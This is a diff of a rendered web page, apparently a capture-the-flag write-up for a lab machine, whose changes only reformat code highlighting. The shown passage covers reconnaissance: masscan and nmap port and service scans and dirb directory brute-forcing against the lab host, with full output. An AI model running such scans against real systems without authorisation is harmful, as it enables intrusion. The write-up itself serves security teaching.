@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<meta name="generator" content="Hugo 0.91.2" />
+<meta name="generator" content="Hugo 0.96.0" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
 <link rel="preload" href="https://alamot.github.io/css/noncrit.css" as="style" onload="this.rel='stylesheet'">
 <noscript><link rel="stylesheet" href="https://alamot.github.io/css/noncrit.css"></noscript>
@@ -336,338 +336,338 @@ if (language) {
 <h2 id="port-scanning">Port scanning</h2>
 
 <p>We scan the full range of TCP ports using masscan:
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>sudo masscan -e tun0 -p0-65535 --max-rate <span class="m">500</span> 10.10.10.61
-<span class="err">
-</span><span class="err"></span><span class="go">Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2018-03-15 09:28:39 GMT
-</span><span class="go"> -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
-</span><span class="go">Initiating SYN Stealth Scan
-</span><span class="go">Scanning 1 hosts [65536 ports/host]
-</span><span class="go">Discovered open port 8080/tcp on 10.10.10.61                                   
-</span><span class="go">Discovered open port 443/tcp on 10.10.10.61                                    
-</span><span class="go">Discovered open port 80/tcp on 10.10.10.61                                     
-</span><span class="go">Discovered open port 22/tcp on 10.10.10.61                                     
-</span><span class="go">Discovered open port 32812/tcp on 10.10.10.61                                  
-</span><span class="go">rate:  0.00-kpps, 100.00% done, waiting 0-secs, found=5
-</span></code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> sudo masscan -e tun0 -p0-65535 --max-rate <span class="m">500</span> 10.10.10.61
+</span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2018-03-15 09:28:39 GMT
+</span></span></span><span class="line"><span class="cl"><span class="go"> -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
+</span></span></span><span class="line"><span class="cl"><span class="go">Initiating SYN Stealth Scan
+</span></span></span><span class="line"><span class="cl"><span class="go">Scanning 1 hosts [65536 ports/host]
+</span></span></span><span class="line"><span class="cl"><span class="go">Discovered open port 8080/tcp on 10.10.10.61                                   
+</span></span></span><span class="line"><span class="cl"><span class="go">Discovered open port 443/tcp on 10.10.10.61                                    
+</span></span></span><span class="line"><span class="cl"><span class="go">Discovered open port 80/tcp on 10.10.10.61                                     
+</span></span></span><span class="line"><span class="cl"><span class="go">Discovered open port 22/tcp on 10.10.10.61                                     
+</span></span></span><span class="line"><span class="cl"><span class="go">Discovered open port 32812/tcp on 10.10.10.61                                  
+</span></span></span><span class="line"><span class="cl"><span class="go">rate:  0.00-kpps, 100.00% done, waiting 0-secs, found=5
+</span></span></span></code></pre></div></div></p>
 
 <p>We found TCP ports 22, 80, 443, 8080 and 32812 open. Let&rsquo;s explore them using nmap:</p>
 
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>sudo nmap -A -p22,80,443,8080,32812 10.10.10.61
-<span class="err">
-</span><span class="err"></span><span class="go">Starting Nmap 7.60 ( https://nmap.org ) at 2018-03-15 11:33 EET
-</span><span class="go">Nmap scan report for 10.10.10.61
-</span><span class="go">Host is up (0.10s latency).
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">PORT      STATE SERVICE  VERSION
-</span><span class="go">22/tcp    open  ssh      (protocol 2.0)
-</span><span class="go">| fingerprint-strings: 
-</span><span class="go">|   NULL: 
-</span><span class="go">|_    SSH-2.0-OpenSSH_7.4p1 Ubuntu-10
-</span><span class="go">| ssh-hostkey: 
-</span><span class="go">|   2048 c4:e9:8c:c5:b5:52:23:f4:b8:ce:d1:96:4a:c0:fa:ac (RSA)
-</span><span class="go">|   256 f3:9a:85:58:aa:d9:81:38:2d:ea:15:18:f7:8e:dd:42 (ECDSA)
-</span><span class="go">|_  256 de:bf:11:6d:c0:27:e3:fc:1b:34:c0:4f:4f:6c:76:8b (EdDSA)
-</span><span class="go">80/tcp    open  http     Apache httpd 2.4.10 ((Debian))
-</span><span class="go">|_http-generator: WordPress 4.8.1
-</span><span class="go">|_http-server-header: Apache/2.4.10 (Debian)
-</span><span class="go">|_http-title: USS Enterprise &amp;#8211; Ships Log
-</span><span class="go">443/tcp   open  ssl/http Apache httpd 2.4.25 ((Ubuntu))
-</span><span class="go">|_http-title: 400 Bad Request
-</span><span class="go">| ssl-cert: Subject: commonName=enterprise.local/organizationName=USS Enterprise/stateOrProvinceName=United Federation of Planets/countryName=UK
-</span><span class="go">| Not valid before: 2017-08-25T10:35:14
-</span><span class="go">|_Not valid after:  2017-09-24T10:35:14
-</span><span class="go">|_ssl-date: TLS randomness does not represent time
-</span><span class="go">8080/tcp  open  http     Apache httpd 2.4.10 ((Debian))
-</span><span class="go">|_http-generator: Joomla! - Open Source Content Management
-</span><span class="go">|_http-open-proxy: Proxy might be redirecting requests
-</span><span class="go">| http-robots.txt: 15 disallowed entries 
-</span><span class="go">| /joomla/administrator/ /administrator/ /bin/ /cache/ 
-</span><span class="go">| /cli/ /components/ /includes/ /installation/ /language/ 
-</span><span class="go">|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
-</span><span class="go">|_http-server-header: Apache/2.4.10 (Debian)
-</span><span class="go">|_http-title: Home
-</span><span class="go">32812/tcp open  unknown
-</span><span class="go">| fingerprint-strings: 
-</span><span class="go">|   GenericLines, GetRequest, HTTPOptions: 
-</span><span class="go">|     _______ _______ ______ _______
-</span><span class="go">|     |_____| |_____/ |______
-</span><span class="go">|     |_____ |_____ | | | _ ______|
-</span><span class="go">|     Welcome to the Library Computer Access and Retrieval System
-</span><span class="go">|     Enter Bridge Access Code: 
-</span><span class="go">|     Invalid Code
-</span><span class="go">|     Terminating Console
-</span><span class="go">|   NULL: 
-</span><span class="go">|     _______ _______ ______ _______
-</span><span class="go">|     |_____| |_____/ |______
-</span><span class="go">|     |_____ |_____ | | | _ ______|
-</span><span class="go">|     Welcome to the Library Computer Access and Retrieval System
-</span><span class="go">|_    Enter Bridge Access Code:
-</span><span class="go">2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
-</span><span class="go">==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
-</span><span class="go">SF-Port22-TCP:V=7.60%I=7%D=3/15%Time=5AAA3DEE%P=x86_64-pc-linux-gnu%r(NULL
-</span><span class="go">SF:,20,&#34;SSH-2\.0-OpenSSH_7\.4p1\x20Ubuntu-10\n&#34;);
-</span><span class="go">==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
-</span><span class="go">SF-Port32812-TCP:V=7.60%I=7%D=3/15%Time=5AAA3DEE%P=x86_64-pc-linux-gnu%r(N
-</span><span class="go">SF:ULL,ED,&#34;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
-</span><span class="go">SF:x20\x20_______\x20_______\x20\x20______\x20_______\n\x20\x20\x20\x20\x2
-</span><span class="go">SF:0\x20\x20\x20\x20\x20\|\x20\x20\x20\x20\x20\x20\|\x20\x20\x20\x20\x20\x
-</span><span class="go">SF:20\x20\|_____\|\x20\|_____/\x20\|______\n\x20\x20\x20\x20\x20\x20\x20\x
-</span><span class="go">SF:20\x20\x20\|_____\x20\|_____\x20\x20\|\x20\x20\x20\x20\x20\|\x20\|\x20\
-</span><span class="go">SF:x20\x20\x20\\_\x20______\|\n\nWelcome\x20to\x20the\x20Library\x20Comput
-</span><span class="go">SF:er\x20Access\x20and\x20Retrieval\x20System\n\nEnter\x20Bridge\x20Access
-</span><span class="go">SF:\x20Code:\x20\n&#34;)%r(GenericLines,110,&#34;\n\x20\x20\x20\x20\x20\x20\x20\x2
-</span><span class="go">SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20_______\x20_______\x20\x20______\x
-</span><span class="go">SF:20_______\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|\x20\x20\x20\x20\x
-</span><span class="go">SF:20\x20\|\x20\x20\x20\x20\x20\x20\x20\|_____\|\x20\|_____/\x20\|______\n
-</span><span class="go">SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|_____\x20\|_____\x20\x20\|\x2
-</span><span class="go">SF:0\x20\x20\x20\x20\|\x20\|\x20\x20\x20\x20\\_\x20______\|\n\nWelcome\x20
-</span><span class="go">SF:to\x20the\x20Library\x20Computer\x20Access\x20and\x20Retrieval\x20Syste
-</span><span class="go">SF:m\n\nEnter\x20Bridge\x20Access\x20Code:\x20\n\nInvalid\x20Code\nTermina
-</span><span class="go">SF:ting\x20Console\n\n&#34;)%r(GetRequest,110,&#34;\n\x20\x20\x20\x20\x20\x20\x20\
-</span><span class="go">SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_______\x20_______\x20\x20______
-</span><span class="go">SF:\x20_______\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|\x20\x20\x20\x20
-</span><span class="go">SF:\x20\x20\|\x20\x20\x20\x20\x20\x20\x20\|_____\|\x20\|_____/\x20\|______
-</span><span class="go">SF:\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|_____\x20\|_____\x20\x20\|\
-</span><span class="go">SF:x20\x20\x20\x20\x20\|\x20\|\x20\x20\x20\x20\\_\x20______\|\n\nWelcome\x
-</span><span class="go">SF:20to\x20the\x20Library\x20Computer\x20Access\x20and\x20Retrieval\x20Sys
-</span><span class="go">SF:tem\n\nEnter\x20Bridge\x20Access\x20Code:\x20\n\nInvalid\x20Code\nTermi
-</span><span class="go">SF:nating\x20Console\n\n&#34;)%r(HTTPOptions,110,&#34;\n\x20\x20\x20\x20\x20\x20\x
-</span><span class="go">SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_______\x20_______\x20\x20___
-</span><span class="go">SF:___\x20_______\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|\x20\x20\x20\
-</span><span class="go">SF:x20\x20\x20\|\x20\x20\x20\x20\x20\x20\x20\|_____\|\x20\|_____/\x20\|___
-</span><span class="go">SF:___\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|_____\x20\|_____\x20\x20
-</span><span class="go">SF:\|\x20\x20\x20\x20\x20\|\x20\|\x20\x20\x20\x20\\_\x20______\|\n\nWelcom
-</span><span class="go">SF:e\x20to\x20the\x20Library\x20Computer\x20Access\x20and\x20Retrieval\x20
-</span><span class="go">SF:System\n\nEnter\x20Bridge\x20Access\x20Code:\x20\n\nInvalid\x20Code\nTe
-</span><span class="go">SF:rminating\x20Console\n\n&#34;);
-</span><span class="go">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
-</span><span class="go">Aggressive OS guesses: Linux 3.12 (95%), Linux 3.13 (95%), Linux 3.16 (95%), Linux 3.18 (95%), Linux 3.2 - 4.8 (95%), Linux 3.8 - 3.11 (95%), Linux 4.2 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%)
-</span></code></pre></div></div>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> sudo nmap -A -p22,80,443,8080,32812 10.10.10.61
+</span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Starting Nmap 7.60 ( https://nmap.org ) at 2018-03-15 11:33 EET
+</span></span></span><span class="line"><span class="cl"><span class="go">Nmap scan report for 10.10.10.61
+</span></span></span><span class="line"><span class="cl"><span class="go">Host is up (0.10s latency).
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">PORT      STATE SERVICE  VERSION
+</span></span></span><span class="line"><span class="cl"><span class="go">22/tcp    open  ssh      (protocol 2.0)
+</span></span></span><span class="line"><span class="cl"><span class="go">| fingerprint-strings: 
+</span></span></span><span class="line"><span class="cl"><span class="go">|   NULL: 
+</span></span></span><span class="line"><span class="cl"><span class="go">|_    SSH-2.0-OpenSSH_7.4p1 Ubuntu-10
+</span></span></span><span class="line"><span class="cl"><span class="go">| ssh-hostkey: 
+</span></span></span><span class="line"><span class="cl"><span class="go">|   2048 c4:e9:8c:c5:b5:52:23:f4:b8:ce:d1:96:4a:c0:fa:ac (RSA)
+</span></span></span><span class="line"><span class="cl"><span class="go">|   256 f3:9a:85:58:aa:d9:81:38:2d:ea:15:18:f7:8e:dd:42 (ECDSA)
+</span></span></span><span class="line"><span class="cl"><span class="go">|_  256 de:bf:11:6d:c0:27:e3:fc:1b:34:c0:4f:4f:6c:76:8b (EdDSA)
+</span></span></span><span class="line"><span class="cl"><span class="go">80/tcp    open  http     Apache httpd 2.4.10 ((Debian))
+</span></span></span><span class="line"><span class="cl"><span class="go">|_http-generator: WordPress 4.8.1
+</span></span></span><span class="line"><span class="cl"><span class="go">|_http-server-header: Apache/2.4.10 (Debian)
+</span></span></span><span class="line"><span class="cl"><span class="go">|_http-title: USS Enterprise &amp;#8211; Ships Log
+</span></span></span><span class="line"><span class="cl"><span class="go">443/tcp   open  ssl/http Apache httpd 2.4.25 ((Ubuntu))
+</span></span></span><span class="line"><span class="cl"><span class="go">|_http-title: 400 Bad Request
+</span></span></span><span class="line"><span class="cl"><span class="go">| ssl-cert: Subject: commonName=enterprise.local/organizationName=USS Enterprise/stateOrProvinceName=United Federation of Planets/countryName=UK
+</span></span></span><span class="line"><span class="cl"><span class="go">| Not valid before: 2017-08-25T10:35:14
+</span></span></span><span class="line"><span class="cl"><span class="go">|_Not valid after:  2017-09-24T10:35:14
+</span></span></span><span class="line"><span class="cl"><span class="go">|_ssl-date: TLS randomness does not represent time
+</span></span></span><span class="line"><span class="cl"><span class="go">8080/tcp  open  http     Apache httpd 2.4.10 ((Debian))
+</span></span></span><span class="line"><span class="cl"><span class="go">|_http-generator: Joomla! - Open Source Content Management
+</span></span></span><span class="line"><span class="cl"><span class="go">|_http-open-proxy: Proxy might be redirecting requests
+</span></span></span><span class="line"><span class="cl"><span class="go">| http-robots.txt: 15 disallowed entries 
+</span></span></span><span class="line"><span class="cl"><span class="go">| /joomla/administrator/ /administrator/ /bin/ /cache/ 
+</span></span></span><span class="line"><span class="cl"><span class="go">| /cli/ /components/ /includes/ /installation/ /language/ 
+</span></span></span><span class="line"><span class="cl"><span class="go">|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
+</span></span></span><span class="line"><span class="cl"><span class="go">|_http-server-header: Apache/2.4.10 (Debian)
+</span></span></span><span class="line"><span class="cl"><span class="go">|_http-title: Home
+</span></span></span><span class="line"><span class="cl"><span class="go">32812/tcp open  unknown
+</span></span></span><span class="line"><span class="cl"><span class="go">| fingerprint-strings: 
+</span></span></span><span class="line"><span class="cl"><span class="go">|   GenericLines, GetRequest, HTTPOptions: 
+</span></span></span><span class="line"><span class="cl"><span class="go">|     _______ _______ ______ _______
+</span></span></span><span class="line"><span class="cl"><span class="go">|     |_____| |_____/ |______
+</span></span></span><span class="line"><span class="cl"><span class="go">|     |_____ |_____ | | | _ ______|
+</span></span></span><span class="line"><span class="cl"><span class="go">|     Welcome to the Library Computer Access and Retrieval System
+</span></span></span><span class="line"><span class="cl"><span class="go">|     Enter Bridge Access Code: 
+</span></span></span><span class="line"><span class="cl"><span class="go">|     Invalid Code
+</span></span></span><span class="line"><span class="cl"><span class="go">|     Terminating Console
+</span></span></span><span class="line"><span class="cl"><span class="go">|   NULL: 
+</span></span></span><span class="line"><span class="cl"><span class="go">|     _______ _______ ______ _______
+</span></span></span><span class="line"><span class="cl"><span class="go">|     |_____| |_____/ |______
+</span></span></span><span class="line"><span class="cl"><span class="go">|     |_____ |_____ | | | _ ______|
+</span></span></span><span class="line"><span class="cl"><span class="go">|     Welcome to the Library Computer Access and Retrieval System
+</span></span></span><span class="line"><span class="cl"><span class="go">|_    Enter Bridge Access Code:
+</span></span></span><span class="line"><span class="cl"><span class="go">2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
+</span></span></span><span class="line"><span class="cl"><span class="go">==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+</span></span></span><span class="line"><span class="cl"><span class="go">SF-Port22-TCP:V=7.60%I=7%D=3/15%Time=5AAA3DEE%P=x86_64-pc-linux-gnu%r(NULL
+</span></span></span><span class="line"><span class="cl"><span class="go">SF:,20,&#34;SSH-2\.0-OpenSSH_7\.4p1\x20Ubuntu-10\n&#34;);
+</span></span></span><span class="line"><span class="cl"><span class="go">==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+</span></span></span><span class="line"><span class="cl"><span class="go">SF-Port32812-TCP:V=7.60%I=7%D=3/15%Time=5AAA3DEE%P=x86_64-pc-linux-gnu%r(N
+</span></span></span><span class="line"><span class="cl"><span class="go">SF:ULL,ED,&#34;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
+</span></span></span><span class="line"><span class="cl"><span class="go">SF:x20\x20_______\x20_______\x20\x20______\x20_______\n\x20\x20\x20\x20\x2
+</span></span></span><span class="line"><span class="cl"><span class="go">SF:0\x20\x20\x20\x20\x20\|\x20\x20\x20\x20\x20\x20\|\x20\x20\x20\x20\x20\x
+</span></span></span><span class="line"><span class="cl"><span class="go">SF:20\x20\|_____\|\x20\|_____/\x20\|______\n\x20\x20\x20\x20\x20\x20\x20\x
+</span></span></span><span class="line"><span class="cl"><span class="go">SF:20\x20\x20\|_____\x20\|_____\x20\x20\|\x20\x20\x20\x20\x20\|\x20\|\x20\
+</span></span></span><span class="line"><span class="cl"><span class="go">SF:x20\x20\x20\\_\x20______\|\n\nWelcome\x20to\x20the\x20Library\x20Comput
+</span></span></span><span class="line"><span class="cl"><span class="go">SF:er\x20Access\x20and\x20Retrieval\x20System\n\nEnter\x20Bridge\x20Access
+</span></span></span><span class="line"><span class="cl"><span class="go">SF:\x20Code:\x20\n&#34;)%r(GenericLines,110,&#34;\n\x20\x20\x20\x20\x20\x20\x20\x2
+</span></span></span><span class="line"><span class="cl"><span class="go">SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20_______\x20_______\x20\x20______\x
+</span></span></span><span class="line"><span class="cl"><span class="go">SF:20_______\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|\x20\x20\x20\x20\x
+</span></span></span><span class="line"><span class="cl"><span class="go">SF:20\x20\|\x20\x20\x20\x20\x20\x20\x20\|_____\|\x20\|_____/\x20\|______\n
+</span></span></span><span class="line"><span class="cl"><span class="go">SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|_____\x20\|_____\x20\x20\|\x2
+</span></span></span><span class="line"><span class="cl"><span class="go">SF:0\x20\x20\x20\x20\|\x20\|\x20\x20\x20\x20\\_\x20______\|\n\nWelcome\x20
+</span></span></span><span class="line"><span class="cl"><span class="go">SF:to\x20the\x20Library\x20Computer\x20Access\x20and\x20Retrieval\x20Syste
+</span></span></span><span class="line"><span class="cl"><span class="go">SF:m\n\nEnter\x20Bridge\x20Access\x20Code:\x20\n\nInvalid\x20Code\nTermina
+</span></span></span><span class="line"><span class="cl"><span class="go">SF:ting\x20Console\n\n&#34;)%r(GetRequest,110,&#34;\n\x20\x20\x20\x20\x20\x20\x20\
+</span></span></span><span class="line"><span class="cl"><span class="go">SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_______\x20_______\x20\x20______
+</span></span></span><span class="line"><span class="cl"><span class="go">SF:\x20_______\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|\x20\x20\x20\x20
+</span></span></span><span class="line"><span class="cl"><span class="go">SF:\x20\x20\|\x20\x20\x20\x20\x20\x20\x20\|_____\|\x20\|_____/\x20\|______
+</span></span></span><span class="line"><span class="cl"><span class="go">SF:\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|_____\x20\|_____\x20\x20\|\
+</span></span></span><span class="line"><span class="cl"><span class="go">SF:x20\x20\x20\x20\x20\|\x20\|\x20\x20\x20\x20\\_\x20______\|\n\nWelcome\x
+</span></span></span><span class="line"><span class="cl"><span class="go">SF:20to\x20the\x20Library\x20Computer\x20Access\x20and\x20Retrieval\x20Sys
+</span></span></span><span class="line"><span class="cl"><span class="go">SF:tem\n\nEnter\x20Bridge\x20Access\x20Code:\x20\n\nInvalid\x20Code\nTermi
+</span></span></span><span class="line"><span class="cl"><span class="go">SF:nating\x20Console\n\n&#34;)%r(HTTPOptions,110,&#34;\n\x20\x20\x20\x20\x20\x20\x
+</span></span></span><span class="line"><span class="cl"><span class="go">SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_______\x20_______\x20\x20___
+</span></span></span><span class="line"><span class="cl"><span class="go">SF:___\x20_______\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|\x20\x20\x20\
+</span></span></span><span class="line"><span class="cl"><span class="go">SF:x20\x20\x20\|\x20\x20\x20\x20\x20\x20\x20\|_____\|\x20\|_____/\x20\|___
+</span></span></span><span class="line"><span class="cl"><span class="go">SF:___\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|_____\x20\|_____\x20\x20
+</span></span></span><span class="line"><span class="cl"><span class="go">SF:\|\x20\x20\x20\x20\x20\|\x20\|\x20\x20\x20\x20\\_\x20______\|\n\nWelcom
+</span></span></span><span class="line"><span class="cl"><span class="go">SF:e\x20to\x20the\x20Library\x20Computer\x20Access\x20and\x20Retrieval\x20
+</span></span></span><span class="line"><span class="cl"><span class="go">SF:System\n\nEnter\x20Bridge\x20Access\x20Code:\x20\n\nInvalid\x20Code\nTe
+</span></span></span><span class="line"><span class="cl"><span class="go">SF:rminating\x20Console\n\n&#34;);
+</span></span></span><span class="line"><span class="cl"><span class="go">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+</span></span></span><span class="line"><span class="cl"><span class="go">Aggressive OS guesses: Linux 3.12 (95%), Linux 3.13 (95%), Linux 3.16 (95%), Linux 3.18 (95%), Linux 3.2 - 4.8 (95%), Linux 3.8 - 3.11 (95%), Linux 4.2 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%)
+</span></span></span></code></pre></div></div>
 
 <h2 id="brute-forcing-directories-and-files">Brute-forcing directories and files</h2>
 
 <h3 id="port-80">Port 80</h3>
 
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>dirb http://10.10.10.61/
-<span class="err">
-</span><span class="err"></span><span class="go">-----------------
-</span><span class="go">DIRB v2.22    
-</span><span class="go">By The Dark Raver
-</span><span class="go">-----------------
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">START_TIME: Thu Mar 15 13:28:08 2018
-</span><span class="go">URL_BASE: http://10.10.10.61/
-</span><span class="go">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">-----------------
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">GENERATED WORDS: 4612                                                          
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">---- Scanning URL: http://10.10.10.61/ ----
-</span><span class="go">+ http://10.10.10.61/index.php (CODE:301|SIZE:0)                                                                   
-</span><span class="go">+ http://10.10.10.61/server-status (CODE:403|SIZE:299)                                                             
-</span><span class="go">==&gt; DIRECTORY: http://10.10.10.61/wp-admin/                                                                        
-</span><span class="go">==&gt; DIRECTORY: http://10.10.10.61/wp-content/                                                                      
-</span><span class="go">==&gt; DIRECTORY: http://10.10.10.61/wp-includes/                                                                     
-</span><span class="go">+ http://10.10.10.61/xmlrpc.php (CODE:405|SIZE:42)                                                                 
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">---- Entering directory: http://10.10.10.61/wp-admin/ ----
-</span><span class="go">+ http://10.10.10.61/wp-admin/admin.php (CODE:302|SIZE:0)                                                          
-</span><span class="go">==&gt; DIRECTORY: http://10.10.10.61/wp-admin/css/                                                                    
-</span><span class="go">==&gt; DIRECTORY: http://10.10.10.61/wp-admin/images/                                                                 
-</span><span class="go">==&gt; DIRECTORY: http://10.10.10.61/wp-admin/includes/                                                               
-</span><span class="go">+ http://10.10.10.61/wp-admin/index.php (CODE:302|SIZE:0)                                                          
-</span><span class="go">==&gt; DIRECTORY: http://10.10.10.61/wp-admin/js/                                                                     
-</span><span class="go">==&gt; DIRECTORY: http://10.10.10.61/wp-admin/maint/                                                                  
-</span><span class="go">==&gt; DIRECTORY: http://10.10.10.61/wp-admin/network/                                                                
-</span><span class="go">==&gt; DIRECTORY: http://10.10.10.61/wp-admin/user/                                                                   
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">---- Entering directory: http://10.10.10.61/wp-content/ ----
-</span><span class="go">+ http://10.10.10.61/wp-content/index.php (CODE:200|SIZE:0)                                                        
-</span><span class="go">==&gt; DIRECTORY: http://10.10.10.61/wp-content/languages/                                                            
-</span><span class="go">==&gt; DIRECTORY: http://10.10.10.61/wp-content/plugins/                                                              
-</span><span class="go">==&gt; DIRECTORY: http://10.10.10.61/wp-content/themes/                                                               
-</span><span class="go">==&gt; DIRECTORY: http://10.10.10.61/wp-content/upgrade/                                                              
-</span><span class="go">==&gt; DIRECTORY: http://10.10.10.61/wp-content/uploads/                                                              
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">---- Entering directory: http://10.10.10.61/wp-includes/ ----
-</span><span class="go">==&gt; DIRECTORY: http://10.10.10.61/wp-includes/certificates/                                                        
-</span><span class="go">==&gt; DIRECTORY: http://10.10.10.61/wp-includes/css/                                                                 
-</span><span class="go">==&gt; DIRECTORY: http://10.10.10.61/wp-includes/customize/                                                           
-</span><span class="go">==&gt; DIRECTORY: http://10.10.10.61/wp-includes/fonts/                                                               
-</span><span class="go">==&gt; DIRECTORY: http://10.10.10.61/wp-includes/images/
-</span></code></pre></div></div>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> dirb http://10.10.10.61/
+</span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">-----------------
+</span></span></span><span class="line"><span class="cl"><span class="go">DIRB v2.22    
+</span></span></span><span class="line"><span class="cl"><span class="go">By The Dark Raver
+</span></span></span><span class="line"><span class="cl"><span class="go">-----------------
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">START_TIME: Thu Mar 15 13:28:08 2018
+</span></span></span><span class="line"><span class="cl"><span class="go">URL_BASE: http://10.10.10.61/
+</span></span></span><span class="line"><span class="cl"><span class="go">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">-----------------
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">GENERATED WORDS: 4612                                                          
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">---- Scanning URL: http://10.10.10.61/ ----
+</span></span></span><span class="line"><span class="cl"><span class="go">+ http://10.10.10.61/index.php (CODE:301|SIZE:0)                                                                   
+</span></span></span><span class="line"><span class="cl"><span class="go">+ http://10.10.10.61/server-status (CODE:403|SIZE:299)                                                             
+</span></span></span><span class="line"><span class="cl"><span class="go">==&gt; DIRECTORY: http://10.10.10.61/wp-admin/                                                                        
+</span></span></span><span class="line"><span class="cl"><span class="go">==&gt; DIRECTORY: http://10.10.10.61/wp-content/                                                                      
+</span></span></span><span class="line"><span class="cl"><span class="go">==&gt; DIRECTORY: http://10.10.10.61/wp-includes/                                                                     
+</span></span></span><span class="line"><span class="cl"><span class="go">+ http://10.10.10.61/xmlrpc.php (CODE:405|SIZE:42)                                                                 
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">---- Entering directory: http://10.10.10.61/wp-admin/ ----
+</span></span></span><span class="line"><span class="cl"><span class="go">+ http://10.10.10.61/wp-admin/admin.php (CODE:302|SIZE:0)                                                          
+</span></span></span><span class="line"><span class="cl"><span class="go">==&gt; DIRECTORY: http://10.10.10.61/wp-admin/css/                                                                    
+</span></span></span><span class="line"><span class="cl"><span class="go">==&gt; DIRECTORY: http://10.10.10.61/wp-admin/images/                                                                 
+</span></span></span><span class="line"><span class="cl"><span class="go">==&gt; DIRECTORY: http://10.10.10.61/wp-admin/includes/                                                               
+</span></span></span><span class="line"><span class="cl"><span class="go">+ http://10.10.10.61/wp-admin/index.php (CODE:302|SIZE:0)                                                          
+</span></span></span><span class="line"><span class="cl"><span class="go">==&gt; DIRECTORY: http://10.10.10.61/wp-admin/js/                                                                     
+</span></span></span><span class="line"><span class="cl"><span class="go">==&gt; DIRECTORY: http://10.10.10.61/wp-admin/maint/                                                                  
+</span></span></span><span class="line"><span class="cl"><span class="go">==&gt; DIRECTORY: http://10.10.10.61/wp-admin/network/                                                                
+</span></span></span><span class="line"><span class="cl"><span class="go">==&gt; DIRECTORY: http://10.10.10.61/wp-admin/user/                                                                   
